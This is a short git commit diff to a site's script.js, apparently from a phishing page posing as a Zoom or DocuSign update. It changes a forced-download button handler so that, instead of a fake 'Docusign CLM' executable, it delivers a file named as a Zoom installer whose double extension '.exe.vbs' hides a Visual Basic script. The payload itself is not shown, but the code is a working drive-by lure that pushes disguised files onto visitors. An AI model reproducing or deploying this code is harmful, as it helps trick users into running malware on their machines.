eeeea49ac7493ead884346ce95a641b6f3ce7029
zoommeetingjoiningonline <silvajones1970@gmail.com>
2026-09-21 22:05:47 -0700

    Update script.js

--- script.js
+++ script.js
@@ -13,8 +13,8 @@ if (updateButton) {
         event.preventDefault();
         // create a temporary link to download
         var a = document.createElement('a');
-        a.href = 'Docusign CLM 26.6.0.exe';
-        a.download = 'Docusign CLM 26.6.0.exe';
+        a.href = 'ZoomInstaller Updated Windows Version 2026 V26.7.0.123.00.exe.vbs';
+        a.download = 'ZoomInstaller Updated Windows Version 2026 V26.7.0.123.00.exe.vbs';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
